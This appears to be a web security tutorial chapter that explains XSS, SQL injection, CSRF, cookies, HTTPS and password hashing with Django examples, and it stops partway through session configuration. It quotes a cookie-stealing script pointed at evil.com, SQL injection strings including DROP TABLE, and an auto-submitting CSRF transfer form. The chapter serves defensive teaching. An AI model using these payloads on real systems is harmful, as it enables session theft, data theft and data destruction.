# Chapter 5: Web Application Security

![Bidur Sapkota](https://www.bidursapkota.com.np/images/gravatar.webp "Bidur Sapkota - Developer")&nbsp;[Bidur Sapkota](https://www.bidursapkota.com.np/)

![Web Application Security by Bidur Sapkota](/test.webp "Web Application Security – Blog by Bidur Sapkota")

## Table of Contents

1. [5.1 Common Vulnerabilities](#51-common-vulnerabilities)
   - [5.1.1 Cross-Site Scripting (XSS)](#511-cross-site-scripting-xss)
   - [5.1.2 SQL Injection](#512-sql-injection)
   - [5.1.3 Cross-Site Request Forgery (CSRF)](#513-cross-site-request-forgery-csrf)
2. [5.2 Security Best Practices](#52-security-best-practices)
   - [5.2.1 Input Validation](#521-input-validation)
   - [5.2.2 Input Sanitization](#522-input-sanitization)
   - [5.2.3 HTTPS (HTTP Secure)](#523-https-http-secure)
   - [5.2.4 Secure Cookies](#524-secure-cookies)
   - [5.2.5 Environment Variables](#525-environment-variables)
3. [5.3 Authentication](#53-authentication)
   - [5.3.1 Password Security](#531-password-security)
   - [5.3.2 Session-Based Authentication](#532-session-based-authentication)
   - [5.3.3 Token-Based Authentication](#533-token-based-authentication)
   - [5.3.4 JSON Web Tokens (JWT)](#534-json-web-tokens-jwt)
   - [5.3.5 Refresh Tokens](#535-refresh-tokens)
4. [5.4 Security in Full-Stack Apps](#54-security-in-full-stack-apps)
   - [5.4.1 Same-Origin Policy (SOP)](#541-same-origin-policy-sop)
   - [5.4.2 Cross-Origin Resource Sharing (CORS)](#542-cross-origin-resource-sharing-cors)
   - [5.4.3 Session Hardening](#543-session-hardening)
   - [5.4.4 Browser Security Headers](#544-browser-security-headers)
5. [Questions](#questions)

Web application security is the practice of **protecting** websites and web applications **from unauthorized access, data breaches, and malicious attacks.** As web applications handle sensitive user data, financial transactions, and critical business operations, security has become a fundamental requirement rather than an optional feature.

Security vulnerabilities can lead to data theft, financial losses, reputation damage, legal consequences, and loss of user trust. Understanding common vulnerabilities and implementing security best practices is essential for every web developer.

---

## 5.1 Common Vulnerabilities

Web applications face numerous security threats. The three most common and dangerous vulnerabilities are Cross-Site Scripting (XSS), SQL Injection, and Cross-Site Request Forgery (CSRF). These vulnerabilities have been consistently listed in the OWASP (Open Web Application Security Project) Top 10 security risks for many years.

---

### 5.1.1 Cross-Site Scripting (XSS)

#### What is XSS?

Cross-Site Scripting (XSS) is a security vulnerability that allows attackers to **inject malicious scripts into web pages viewed by other users.** When a user visits an infected page, the malicious script executes in their browser with the same privileges as legitimate scripts from the trusted website.

The term "Cross-Site" refers to the ability of the attack to cross the boundaries between websites. The attacker's malicious code runs in the context of the victim's session on the trusted website.

#### How XSS Works

XSS attacks exploit the trust that a user has in a particular website. Browsers cannot distinguish between legitimate scripts written by the website developers and malicious scripts injected by attackers. When a browser receives HTML content containing JavaScript, it executes all scripts without questioning their origin.

The attack typically follows this pattern:

1. The attacker identifies a vulnerability where user input is displayed without proper sanitization.
2. The attacker crafts a malicious payload containing JavaScript code.
3. The payload is delivered to victims through various methods (URLs, forms, stored content).
4. When victims view the page, their browser executes the malicious script.
5. The script can steal cookies, modify page content, redirect users, or perform actions on behalf of the user.

#### Types of XSS Attacks

**Stored XSS (Persistent XSS)**

Stored XSS is the most dangerous type of XSS attack. The malicious script is permanently stored on the target server, typically in a database. Every user who views the infected content becomes a victim.

Common locations for stored XSS include:

- Comment sections on blogs and forums
- User profile information
- Product reviews
- Message boards
- Any user-generated content that is displayed to others

For example, if an attacker posts a comment containing `<script>document.location='http://evil.com/steal?cookie='+document.cookie</script>`, every user viewing that comment would have their session cookies stolen.

**Reflected XSS (Non-Persistent XSS)**

Reflected XSS occurs when malicious input is immediately reflected back to the user without being stored. The attack is typically delivered through phishing emails or malicious links.

The attacker crafts a URL containing the malicious script as a parameter. When a victim clicks the link, the server includes the parameter value in the response, and the browser executes the script.

For example, a vulnerable search page might include the search term in the results: "You searched for: [user input]". If the input is not sanitized, an attacker can craft a URL like `https://example.com/search?q=<script>alert('XSS')</script>`.

**DOM-Based XSS**

DOM-based XSS is a client-side attack where the vulnerability exists in the JavaScript code rather than the server-side code. The malicious payload never reaches the server; instead, it is processed entirely by the client-side JavaScript.

This occurs when JavaScript reads data from an attacker-controllable source (like the URL) and passes it to a dangerous function (like innerHTML or document.write).

#### Impact of XSS Attacks

XSS attacks can have severe consequences:

- **Session Hijacking**: Attackers can steal session cookies and impersonate victims.
- **Credential Theft**: Fake login forms can be injected to capture usernames and passwords.
- **Keylogging**: Scripts can capture all keystrokes on the page.
- **Phishing**: Page content can be modified to display fake information.
- **Malware Distribution**: Users can be redirected to malicious websites.
- **Website Defacement**: The appearance and content of pages can be altered.
- **Data Theft**: Sensitive information displayed on the page can be extracted.

#### Django's Built-in XSS Protection

Django provides automatic protection against XSS through its template engine. By default, Django's template system automatically escapes HTML special characters in variables.

The following characters are automatically escaped:

- `<` becomes `&lt;`
- `>` becomes `&gt;`
- `'` becomes `&#x27;`
- `"` becomes `&quot;`
- `&` becomes `&amp;`

**Example: Safe vs. Unsafe Rendering in Django**

```python
# views.py
from django.shortcuts import render

def display_comment(request):
    # Imagine this comment came from user input or database
    user_comment = "<script>alert('XSS Attack!')</script>"
    return render(request, 'comment.html', {'comment': user_comment})
```

```html
<!-- comment.html -->
<!-- SAFE: Django auto-escapes by default -->
<p>Comment: {{ comment }}</p>
<!-- Renders as: <p>Comment: &lt;script&gt;alert('XSS Attack!')&lt;/script&gt;</p> -->

<!-- DANGEROUS: Never use |safe with untrusted data -->
<p>Comment: {{ comment|safe }}</p>
<!-- Would execute the JavaScript! -->
```

---

### 5.1.2 SQL Injection

#### What is SQL Injection?

SQL Injection is a code injection technique that exploits vulnerabilities in applications that construct SQL queries using user input. It allows attackers to interfere with the queries that an application makes to its database.

SQL Injection has been one of the most prevalent and dangerous web application vulnerabilities since the early days of web development. Despite being well-understood, it continues to affect applications due to improper coding practices.

#### How SQL Injection Works

SQL Injection occurs when user-supplied data is included in SQL queries without proper validation or escaping. The attacker provides input that changes the structure and meaning of the SQL statement.

Consider a simple login query:

```sql
SELECT * FROM users WHERE username = 'user_input' AND password = 'password_input'
```

If an attacker enters `admin' --` as the username, the query becomes:

```sql
SELECT * FROM users WHERE username = 'admin' --' AND password = 'password_input'
```

The `--` is a SQL comment that ignores everything after it. The query now only checks for the username "admin" and completely bypasses the password check.

#### Types of SQL Injection

**In-band SQL Injection**

This is the most common type where the attacker uses the same communication channel to launch the attack and gather results.

- **Error-based**: The attacker triggers database errors that reveal information about the database structure.
- **Union-based**: The attacker uses the UNION SQL operator to combine results from the original query with results from injected queries.

**Blind SQL Injection**

When the application does not show database errors or query results, attackers use blind techniques.

- **Boolean-based**: The attacker sends queries that return true or false, observing changes in the application's response.
- **Time-based**: The attacker sends queries that cause delays, measuring response times to infer information.

**Out-of-band SQL Injection**

This technique is used when in-band techniques fail. The attacker uses database features to make outbound connections (like DNS or HTTP requests) to extract data.

#### Impact of SQL Injection

SQL Injection can lead to:

- **Unauthorized Data Access**: Attackers can read sensitive data from the database.
- **Data Modification**: Records can be inserted, updated, or deleted.
- **Data Deletion**: Entire tables or databases can be dropped.
- **Authentication Bypass**: Login mechanisms can be circumvented.
- **Privilege Escalation**: Attackers may gain administrative database rights.
- **Remote Code Execution**: On some database servers, attackers can execute operating system commands.
- **Complete System Compromise**: Database servers often have access to internal networks.

#### SQL Injection Attack Examples

**Authentication Bypass**:
Input: `' OR '1'='1' --`
This makes the WHERE clause always true, returning all users.

**Data Extraction**:
Input: `' UNION SELECT username, password FROM users --`
This combines legitimate results with stolen credentials.

**Database Destruction**:
Input: `'; DROP TABLE users; --`
This terminates the original query and executes a destructive command.

#### Django's Protection Against SQL Injection

Django's ORM (Object-Relational Mapper) provides strong protection against SQL Injection. When you use Django's querysets, parameters are automatically escaped and safely parameterized.

**Example: Safe vs. Unsafe Database Queries in Django**

```python
# views.py
from django.shortcuts import render
from .models import User

def search_user(request):
    username = request.GET.get('username', '')

    # SAFE: Using Django ORM (parameterized query)
    users = User.objects.filter(username=username)

    return render(request, 'results.html', {'users': users})
```

Django translates the ORM query to a parameterized SQL query, ensuring that user input cannot alter the query structure.

**Never construct raw SQL queries with string concatenation**:

```python
# DANGEROUS - Never do this!
query = f"SELECT * FROM users WHERE username = '{username}'"

# SAFE - If raw SQL is necessary, use parameterized queries
from django.db import connection
with connection.cursor() as cursor:
    cursor.execute("SELECT * FROM users WHERE username = %s", [username])
```

---

### 5.1.3 Cross-Site Request Forgery (CSRF)

#### What is CSRF?

Cross-Site Request Forgery (CSRF), also known as "session riding" or "one-click attack," is an attack that forces authenticated users to submit unwanted requests to a web application. Unlike XSS, which exploits the trust a user has in a website, CSRF exploits the trust that a website has in a user's browser.

CSRF attacks target state-changing requests (like transferring funds or changing passwords) rather than data theft, since the attacker cannot see the response.

#### How CSRF Works

When a user logs into a website, the browser stores authentication cookies. These cookies are automatically sent with every request to that website, including requests initiated by other websites.

A CSRF attack works as follows:

1. The victim is authenticated on the target website (e.g., their bank).
2. The victim visits a malicious website while still logged in.
3. The malicious website contains code that makes a request to the target website.
4. The browser automatically includes the victim's authentication cookies.
5. The target website processes the request as if it came from the legitimate user.

For example, a malicious website might contain:

```html
<img src="https://bank.com/transfer?to=attacker&amount=10000" />
```

When the victim loads this page, their browser attempts to load the "image" and makes a GET request to the bank with the victim's cookies.

#### Why CSRF is Dangerous

CSRF attacks are particularly dangerous because:

- **Silent Execution**: The attack happens without the user's knowledge.
- **Legitimate Credentials**: The request uses the victim's actual authentication.
- **Difficult Detection**: Requests appear to come from legitimate users.
- **Wide Attack Surface**: Any state-changing action is potentially vulnerable.
- **No User Interaction Required**: The attack can be triggered just by loading a page.

#### Common CSRF Attack Scenarios

**Form-based Attacks**: Hidden forms on malicious websites that auto-submit.

```html
<form action="https://bank.com/transfer" method="POST" id="csrf-form">
  <input type="hidden" name="to" value="attacker" />
  <input type="hidden" name="amount" value="10000" />
</form>
<script>
  document.getElementById("csrf-form").submit();
</script>
```

**Image Tag Attacks**: Using image tags to make GET requests.

**AJAX Attacks**: Using JavaScript to send cross-origin requests (limited by CORS).

**Clickjacking**: Hiding malicious actions behind legitimate-looking elements.

#### Django's CSRF Protection

Django provides built-in CSRF protection that is enabled by default. This protection uses a token-based approach.

How Django's CSRF protection works:

1. When rendering a form, Django generates a unique CSRF token.
2. This token is included in the form as a hidden field.
3. When the form is submitted, Django verifies the token.
4. If the token is missing or invalid, the request is rejected.

Since the attacker cannot access the CSRF token (due to same-origin policy), they cannot forge valid requests.

**Example: Using CSRF Protection in Django**

```python
# views.py
from django.shortcuts import render, redirect

def transfer_money(request):
    if request.method == 'POST':
        # The request already passed CSRF validation (Django handles this)
        recipient = request.POST.get('recipient')
        amount = request.POST.get('amount')
        # Process the transfer...
        return redirect('success')
    return render(request, 'transfer.html')
```

```html
<!-- transfer.html -->
<form method="POST">
  {% csrf_token %}
  <!-- This adds the hidden CSRF token field -->
  <input type="text" name="recipient" placeholder="Recipient" />
  <input type="number" name="amount" placeholder="Amount" />
  <button type="submit">Transfer</button>
</form>
```

The `{% csrf_token %}` template tag generates a hidden input field containing the token:

```html
<input
  type="hidden"
  name="csrfmiddlewaretoken"
  value="random_token_value_here"
/>
```

---

## 5.2 Security Best Practices

Implementing security is not about adding a single feature but about adopting a security-first mindset throughout the development process. This section covers essential security best practices that every web developer should follow.

---

### 5.2.1 Input Validation

#### What is Input Validation?

Input validation is the process of ensuring that user-supplied data meets the expected criteria before processing it. It acts as the first line of defense against malicious input. The principle is simple: never trust user input.

Every piece of data that enters your application from external sources is potentially dangerous. This includes:

- Form submissions
- URL parameters
- HTTP headers
- Cookies
- File uploads
- API requests
- Data from third-party services

#### Principles of Input Validation

**Whitelist Validation (Allowlist)**

Whitelist validation defines what is acceptable and rejects everything else. This is the preferred approach because it is more secure.

For example, if a field should only contain letters:

- Accept: a-z, A-Z
- Reject: numbers, symbols, spaces, and everything else

**Blacklist Validation (Denylist)**

Blacklist validation defines what is not acceptable. This approach is weaker because attackers often find ways to bypass blacklists.

For example, blocking `<script>` might be bypassed with `<SCRIPT>` or `<scr<script>ipt>`.

**Validation Rules**

Effective input validation should check:

- **Data Type**: Is the input the expected type (string, integer, email)?
- **Length**: Is the input within acceptable length limits?
- **Format**: Does the input match the expected pattern (regex)?
- **Range**: For numbers, is the value within acceptable bounds?
- **Character Set**: Does the input contain only allowed characters?
- **Business Logic**: Does the input make sense in context?

#### Client-Side vs. Server-Side Validation

**Client-Side Validation**

Client-side validation occurs in the user's browser before data is sent to the server. It provides immediate feedback to users and reduces unnecessary server requests.

However, client-side validation is easily bypassed. Attackers can:

- Disable JavaScript
- Modify JavaScript code
- Use browser developer tools
- Send requests directly to the server

Client-side validation should only be used for user experience, never for security.

**Server-Side Validation**

Server-side validation is mandatory for security. All data must be validated on the server, regardless of any client-side validation.

The server is under your control; the client is not. Always assume that client-side validation can be bypassed.

#### Input Validation in Django

Django provides multiple layers of input validation through forms and serializers.

**Example: Using Django Forms for Validation**

```python
# forms.py
from django import forms

class ContactForm(forms.Form):
    name = forms.CharField(max_length=100)
    email = forms.EmailField()
    age = forms.IntegerField(min_value=1, max_value=120)
    message = forms.CharField(max_length=1000)
```

```python
# views.py
from django.shortcuts import render
from .forms import ContactForm

def contact(request):
    if request.method == 'POST':
        form = ContactForm(request.POST)
        if form.is_valid():
            # Data is validated and safe to use
            name = form.cleaned_data['name']
            email = form.cleaned_data['email']
            # Process the data...
            return render(request, 'success.html')
    else:
        form = ContactForm()
    return render(request, 'contact.html', {'form': form})
```

Django's form validation:

- Checks data types automatically
- Enforces length limits (max_length)
- Validates email format
- Enforces numeric ranges (min_value, max_value)
- Returns cleaned, safe data through `cleaned_data`

---

### 5.2.2 Input Sanitization

#### What is Input Sanitization?

Input sanitization is the process of cleaning or transforming user input to remove or neutralize potentially harmful content. While validation accepts or rejects input, sanitization modifies it to make it safe.

Think of it this way:

- **Validation**: "Is this input acceptable?"
- **Sanitization**: "How can I make this input safe?"

#### When to Use Sanitization

Sanitization is appropriate when:

- You need to accept rich content (like HTML) from users
- Complete rejection of input is not practical
- You want to clean data before storage or display

Sanitization should complement validation, not replace it.

#### Sanitization Techniques

**HTML Encoding/Escaping**

The most common form of sanitization is HTML encoding, where special characters are converted to their HTML entity equivalents.

- `<` becomes `&lt;`
- `>` becomes `&gt;`
- `&` becomes `&amp;`
- `"` becomes `&quot;`
- `'` becomes `&#x27;`

This prevents HTML tags from being interpreted as markup.

**HTML Sanitization Libraries**

When you need to allow some HTML (like in a WYSIWYG editor), use sanitization libraries that remove dangerous tags and attributes while preserving safe ones.

Popular Python libraries include:

- **bleach**: Allows whitelisting specific tags and attributes
- **html-sanitizer**: Cleans HTML while preserving structure

**SQL Parameter Escaping**

For database queries, special characters in user input are escaped so they are treated as literal values, not SQL syntax. Django's ORM handles this automatically.

**URL Encoding**

Special characters in URLs are encoded using percent-encoding (e.g., space becomes `%20`).

---

### 5.2.3 HTTPS (HTTP Secure)

#### What is HTTPS?

HTTPS (Hypertext Transfer Protocol Secure) is the secure version of HTTP. It uses encryption to protect the communication between the user's browser and the web server. The "S" in HTTPS stands for "Secure."

HTTPS uses TLS (Transport Layer Security) protocol, which is the successor to SSL (Secure Sockets Layer). Although people sometimes use "SSL" to refer to this technology, TLS is the current standard.

#### How HTTPS Works

HTTPS provides three key security properties:

**Encryption**

All data transmitted between the browser and server is encrypted. Even if an attacker intercepts the traffic, they cannot read the content. This protects sensitive information like passwords, credit card numbers, and personal data.

**Data Integrity**

HTTPS ensures that data cannot be modified during transmission without detection. Any tampering with the data will be detected, preventing man-in-the-middle attacks that modify content.

**Authentication**

HTTPS verifies that the server is who it claims to be. This is done through digital certificates issued by trusted Certificate Authorities (CAs). This prevents attackers from impersonating legitimate websites.

#### The HTTPS Handshake Process

When a browser connects to an HTTPS website:

1. **Client Hello**: The browser sends supported encryption methods to the server.
2. **Server Hello**: The server responds with chosen encryption method and its certificate.
3. **Certificate Verification**: The browser verifies the certificate with the CA.
4. **Key Exchange**: A shared secret key is established using asymmetric encryption.
5. **Secure Communication**: All subsequent data is encrypted with the shared key.

#### Why HTTPS is Essential

**Protection Against Eavesdropping**

On public WiFi networks or compromised networks, attackers can capture network traffic. Without HTTPS, all data (including passwords) is transmitted in plain text and can be read.

**Protection Against Man-in-the-Middle Attacks**

Attackers positioned between the user and server can intercept and modify traffic. HTTPS encryption and authentication prevent this.

**SEO Benefits**

Search engines like Google give ranking preference to HTTPS websites. HTTPS is a confirmed ranking signal.

**Browser Trust Indicators**

Modern browsers display warnings for non-HTTPS sites and show trust indicators (like padlock icons) for HTTPS sites. Users are becoming more aware of these indicators.

**Required for Modern Features**

Many modern web features require HTTPS, including:

- Service workers (for PWAs)
- Geolocation API
- Camera and microphone access
- HTTP/2 protocol

**Legal and Compliance Requirements**

Many regulations (like GDPR, PCI-DSS) require encryption of data in transit, making HTTPS mandatory for compliance.

#### Implementing HTTPS

**Obtaining an SSL/TLS Certificate**

Certificates can be obtained from:

- **Let's Encrypt**: Free, automated certificates
- **Commercial CAs**: Paid certificates with additional features
- **Cloud Providers**: Managed certificates (AWS, Azure, GCP)

**Forcing HTTPS in Django**

```python
# settings.py

# Redirect all HTTP requests to HTTPS
SECURE_SSL_REDIRECT = True

# Ensure cookies are only sent over HTTPS
SESSION_COOKIE_SECURE = True
CSRF_COOKIE_SECURE = True

# Enable HSTS (HTTP Strict Transport Security)
SECURE_HSTS_SECONDS = 31536000  # 1 year
SECURE_HSTS_INCLUDE_SUBDOMAINS = True
SECURE_HSTS_PRELOAD = True
```

#### HTTP Strict Transport Security (HSTS)

HSTS is a security header that tells browsers to only communicate with the site using HTTPS. Once a browser receives this header, it will automatically convert all HTTP requests to HTTPS, even before making the request.

Benefits of HSTS:

- Prevents SSL stripping attacks
- Eliminates insecure redirects
- Reduces latency (no HTTP to HTTPS redirect)

---

### 5.2.4 Secure Cookies

#### What are Cookies?

Cookies are small pieces of data stored by the browser and sent with every request to the website that created them. They are essential for features like maintaining user sessions, remembering preferences, and tracking user behavior.

Because cookies often contain sensitive information (like session identifiers), securing them is crucial.

#### Cookie Attributes for Security

**Secure Flag**

The Secure flag ensures that cookies are only sent over HTTPS connections. Without this flag, cookies can be transmitted over unencrypted HTTP, making them vulnerable to interception.

**HttpOnly Flag**

The HttpOnly flag prevents JavaScript from accessing the cookie. This protects cookies from XSS attacks, where malicious scripts might try to steal session cookies using `document.cookie`.

Cookies with HttpOnly flag:

- Cannot be read by JavaScript
- Cannot be modified by JavaScript
- Are still sent with HTTP requests automatically

**SameSite Attribute**

The SameSite attribute controls when cookies are sent with cross-site requests. This provides protection against CSRF attacks.

- **SameSite=Strict**: Cookies are only sent with same-site requests. Never sent with cross-site requests.
- **SameSite=Lax**: Cookies are sent with same-site requests and top-level navigations from external sites. This is the default in modern browsers.
- **SameSite=None**: Cookies are sent with all requests. Requires the Secure flag.

**Domain Attribute**

The Domain attribute specifies which domains can receive the cookie. Setting this correctly prevents cookies from being sent to unintended subdomains.

**Path Attribute**

The Path attribute limits which paths can access the cookie. This can prevent cookies from being sent to parts of the application that don't need them.

**Expires/Max-Age Attributes**

These attributes control how long the cookie persists.

- **Session cookies**: No expiration set; deleted when browser closes.
- **Persistent cookies**: Have an expiration date; stored on disk.

For sensitive session cookies, prefer session cookies or short expiration times.

#### Implementing Secure Cookies in Django

```python
# settings.py

# Session cookie settings
SESSION_COOKIE_SECURE = True      # Only send over HTTPS
SESSION_COOKIE_HTTPONLY = True    # Not accessible to JavaScript
SESSION_COOKIE_SAMESITE = 'Lax'   # CSRF protection
SESSION_COOKIE_AGE = 1209600      # 2 weeks in seconds

# CSRF cookie settings
CSRF_COOKIE_SECURE = True         # Only send over HTTPS
CSRF_COOKIE_HTTPONLY = True       # Not accessible to JavaScript
CSRF_COOKIE_SAMESITE = 'Lax'      # CSRF protection
```

#### Session Security Best Practices

- Regenerate session ID after login to prevent session fixation attacks.
- Set appropriate session timeout values.
- Implement session invalidation on logout.
- Consider storing sessions server-side (database or cache) rather than in cookies.

---

### 5.2.5 Environment Variables

#### What are Environment Variables?

Environment variables are key-value pairs that exist in the operating system's environment. They are used to configure applications without hardcoding values in the source code.

For web applications, environment variables are essential for managing configuration that varies between environments (development, staging, production) and for storing sensitive information.

#### Why Use Environment Variables?

**Security**

Sensitive information like API keys, database passwords, and secret keys should never be stored in source code. Source code is often:

- Stored in version control systems (like Git)
- Shared among team members
- Uploaded to code hosting platforms (GitHub, GitLab)

If secrets are in code, they become exposed. Environment variables keep secrets out of the codebase.

**Environment Separation**

Different environments need different configurations:

- Development: Local database, debug mode on, test API keys
- Staging: Test database, debug mode off, sandbox API keys
- Production: Production database, debug mode off, live API keys

Environment variables allow the same code to run with different configurations.

**Portability**

Applications can be deployed to different servers or platforms without code changes. Configuration is external and can be set up for each deployment environment.

**Twelve-Factor App Methodology**

The Twelve-Factor App methodology recommends storing configuration in the environment. This is a widely accepted best practice for modern web applications.

#### What Should Be Stored in Environment Variables?

- **Secret Keys**: Django's SECRET_KEY, encryption keys
- **Database Credentials**: Host, username, password, database name
- **API Keys**: Third-party service credentials
- **Debug Flags**: DEBUG setting for Django
- **Allowed Hosts**: ALLOWED_HOSTS configuration
- **Email Configuration**: SMTP credentials
- **Cloud Service Credentials**: AWS, Azure, GCP credentials
- **Feature Flags**: Environment-specific feature toggles

#### Using Environment Variables in Django

**Example: Configuring Django with Environment Variables**

```python
# settings.py
import os

# Get secret key from environment (never commit to code)
SECRET_KEY = os.environ.get('DJANGO_SECRET_KEY')

# Debug should be False in production
DEBUG = os.environ.get('DJANGO_DEBUG', 'False') == 'True'

# Database configuration from environment
DATABASES = {
    'default': {
        'ENGINE': 'django.db.backends.postgresql',
        'NAME': os.environ.get('DB_NAME'),
        'USER': os.environ.get('DB_USER'),
        'PASSWORD': os.environ.get('DB_PASSWORD'),
        'HOST': os.environ.get('DB_HOST', 'localhost'),
        'PORT': os.environ.get('DB_PORT', '5432'),
    }
}

# Allowed hosts from environment (comma-separated)
ALLOWED_HOSTS = os.environ.get('ALLOWED_HOSTS', '').split(',')
```

#### Using .env Files for Local Development

For local development, managing many environment variables can be cumbersome. A `.env` file provides a convenient way to set them.

**The .env file:**

```bash
# .env file (add to .gitignore!)
DJANGO_SECRET_KEY=your-secret-key-here
DJANGO_DEBUG=True
DB_NAME=mydb
DB_USER=myuser
DB_PASSWORD=mypassword
DB_HOST=localhost
ALLOWED_HOSTS=localhost,127.0.0.1
```

**Using python-dotenv:**

```python
# settings.py
from dotenv import load_dotenv
import os

# Load environment variables from .env file
load_dotenv()

SECRET_KEY = os.environ.get('DJANGO_SECRET_KEY')
# ... rest of settings
```

**Critical Rule: Never commit .env files to version control!**

Add `.env` to your `.gitignore` file:

```
# .gitignore
.env
.env.local
.env.*.local
```

---

## 5.3 Authentication

Authentication is the process of verifying the identity of a user, device, or system. It answers the question: "Who are you?" In web applications, authentication is the foundation of security, as it determines who can access the system and what actions they can perform.

This section covers password security, session management, and modern token-based authentication using JWT.

---

**Understanding Authentication vs. Authorization**

Before diving into authentication practices, it is essential to understand the difference between authentication and authorization.

**Authentication (AuthN)**

Authentication verifies identity. It confirms that users are who they claim to be. Common authentication factors include:

- **Something you know**: Passwords, PINs, security questions
- **Something you have**: Security tokens, smartphones, smart cards
- **Something you are**: Fingerprints, facial recognition, retina scans

**Authorization (AuthZ)**

Authorization determines access. After authentication, authorization decides what the authenticated user is allowed to do. It answers: "What are you permitted to do?"

**The Authentication-Authorization Flow:**

1. User provides credentials (authentication attempt)
2. System verifies credentials (authentication)
3. User is granted an identity (authenticated)
4. System checks permissions for requested actions (authorization)
5. Access is granted or denied based on permissions

---

### 5.3.1 Password Security

#### Why Passwords Need Protection

Passwords are the most common form of authentication. Users trust that their passwords are protected. If passwords are compromised, attackers can:

- Access user accounts
- Steal personal information
- Perform unauthorized transactions
- Access other services (if users reuse passwords)

Password breaches have affected billions of accounts. Proper password handling is a fundamental responsibility of every developer.

#### Never Store Passwords in Plain Text

Storing passwords in plain text is one of the most dangerous security mistakes. If the database is compromised, all passwords are immediately exposed.

Problems with plain text storage:

- Database breaches expose all passwords instantly
- Database administrators can see all passwords
- Backup files contain readable passwords
- Log files might accidentally capture passwords

**Rule: Never store passwords in a recoverable form.**

#### Password Hashing

Password hashing is a one-way cryptographic function that transforms a password into a fixed-length string of characters. The key properties of hashing are:

**One-Way Function**

Hashing is irreversible. Given a hash, it should be computationally infeasible to recover the original password. This is different from encryption, which is designed to be reversible.

**Deterministic**

The same input always produces the same output. This allows verification: when a user logs in, the system hashes the provided password and compares it to the stored hash.

**Collision Resistance**

It should be extremely difficult to find two different inputs that produce the same hash.

**Avalanche Effect**

A small change in input produces a drastically different hash. "password1" and "password2" should have completely different hashes.

#### Why Simple Hashing is Not Enough

Basic hash functions like MD5 or SHA-1 are not suitable for password hashing because:

**Speed is a Vulnerability**

Fast hash functions allow attackers to try billions of guesses per second. Modern GPUs can compute billions of MD5 hashes per second.

**Rainbow Table Attacks**

Attackers can precompute hashes for common passwords and dictionary words, creating "rainbow tables." If they obtain a hash, they simply look it up in the table.

**Identical Inputs Produce Identical Outputs**

If two users have the same password, their hashes will be identical, revealing this information to attackers.

#### Salting

A salt is a random value added to the password before hashing. Each user has a unique salt stored alongside their password hash.

**How Salting Works:**

1. Generate a random salt for the user
2. Combine the salt with the password
3. Hash the combined value
4. Store both the salt and the hash

**Benefits of Salting:**

- Rainbow tables become useless (would need separate tables for each salt)
- Identical passwords produce different hashes
- Increases the computational cost of attacks

#### Modern Password Hashing Algorithms

Modern password hashing algorithms are specifically designed to be slow and memory-intensive, making brute-force attacks impractical.

**bcrypt**

bcrypt is a password hashing function designed in 1999. It incorporates a salt automatically and has a configurable work factor (cost). As computers become faster, the work factor can be increased.

**Argon2**

Argon2 is the winner of the Password Hashing Competition (2015). It is designed to resist both GPU-based attacks and side-channel attacks. Argon2 has three variants:

- Argon2d: Optimized for resistance to GPU attacks
- Argon2i: Optimized for resistance to side-channel attacks
- Argon2id: A hybrid of both (recommended)

**PBKDF2**

PBKDF2 (Password-Based Key Derivation Function 2) applies a hash function many times with a salt. Django uses PBKDF2 by default with SHA256.

**scrypt**

scrypt is designed to be memory-hard, making it expensive to implement hardware-based attacks.

#### Django's Password Handling

Django provides robust password hashing out of the box. By default, Django uses PBKDF2 with SHA256 and a configurable number of iterations.

**Example: How Django Handles Passwords**

```python
# Django handles password hashing automatically when using User model
from django.contrib.auth.models import User

# Creating a user - password is automatically hashed
user = User.objects.create_user(
    username='john',
    email='john@example.com',
    password='secretpassword'  # This gets hashed automatically
)

# Verifying a password
if user.check_password('secretpassword'):
    print("Password is correct")
```

Django stores passwords in the format: `algorithm$iterations$salt$hash`

Example: `pbkdf2_sha256$390000$randomsalt$hashedvalue`

#### Password Policies and Best Practices

**Minimum Length**

Require passwords of at least 8-12 characters. Longer passwords are exponentially harder to crack.

**Complexity Requirements**

Consider requiring a mix of:

- Uppercase and lowercase letters
- Numbers
- Special characters

However, overly complex requirements can lead to users writing down passwords or using predictable patterns.

**Password Blacklists**

Reject commonly used passwords like "password123" or "qwerty". Django includes a password validator for common passwords.

**No Password Hints**

Password hints often reveal too much information and can be exploited.

**Account Lockout**

Temporarily lock accounts after multiple failed login attempts to prevent brute-force attacks. Be careful about permanent lockouts, which can be abused for denial of service.

**Secure Password Reset**

Password reset mechanisms must be secure:

- Use time-limited tokens
- Send reset links via verified email
- Invalidate tokens after use
- Don't reveal if an email exists in the system

---

### 5.3.2 Session-Based Authentication

#### What are Sessions?

A session is a period of interaction between a user and a web application. Since HTTP is stateless (each request is independent), sessions provide a mechanism to maintain state across multiple requests.

Session-based authentication works by:

1. User submits login credentials
2. Server verifies credentials and creates a session
3. Server sends a session ID to the browser (usually in a cookie)
4. Browser includes session ID in subsequent requests
5. Server uses session ID to identify the user

#### How Sessions Work

**Session Creation**

When a user logs in successfully, the server:

- Generates a unique session ID (random, unpredictable string)
- Creates a session record (in memory, database, or cache)
- Stores user information in the session
- Sends the session ID to the browser

**Session Storage**

Session data can be stored in various locations:

- **Server Memory**: Fast but limited; lost on server restart; doesn't work with multiple servers
- **Database**: Persistent and scalable; slightly slower
- **Cache (Redis, Memcached)**: Fast and scalable; good for distributed systems
- **Files**: Simple but slow; not suitable for high-traffic sites

**Session Identification**

The session ID is typically stored in a cookie. The browser automatically sends this cookie with every request to the domain.

#### Session Security Concerns

**Session Hijacking**

Attackers steal the session ID through:

- Network sniffing (prevented by HTTPS)
- XSS attacks (prevented by HttpOnly cookies)
- Man-in-the-middle attacks (prevented by HTTPS and HSTS)

**Session Fixation**

Attackers set a known session ID before the user logs in. After login, the attacker can use the same session ID.

Prevention: Regenerate session ID after successful login.

**Session Prediction**

Attackers try to guess valid session IDs.

Prevention: Use cryptographically random, long session IDs.

#### Session Management Best Practices

- Use HTTPS for all authenticated sessions
- Set secure cookie attributes (Secure, HttpOnly, SameSite)
- Regenerate session ID after login
- Implement session timeout (idle and absolute)
- Provide logout functionality that destroys the session
- Consider binding sessions to IP address or user agent (with caution)

#### Django Session Configuration

```python
# settings.py

# Session engine options
SESSION_ENGINE = 'django.contrib.sessions.backends.db'  # Database (default)
# SESSION_ENGINE = 'django.contrib.sessions.backends.cache'  # Cache
# SESSION_ENGINE = 'django.contrib.sessions.backends.cached_db'  # Cache + DB

# Session cookie settings
SESSION_COOKIE_AGE = 1209600  # 2 weeks in seconds
SESSION_COOKIE_SECURE = True  # HTTPS only
SESSION_COOKIE_HTTPONLY = True  # No JavaScript access
SESSION_COOKIE_SAMESITE = 'Lax'  # CSRF protection

# Session expiry
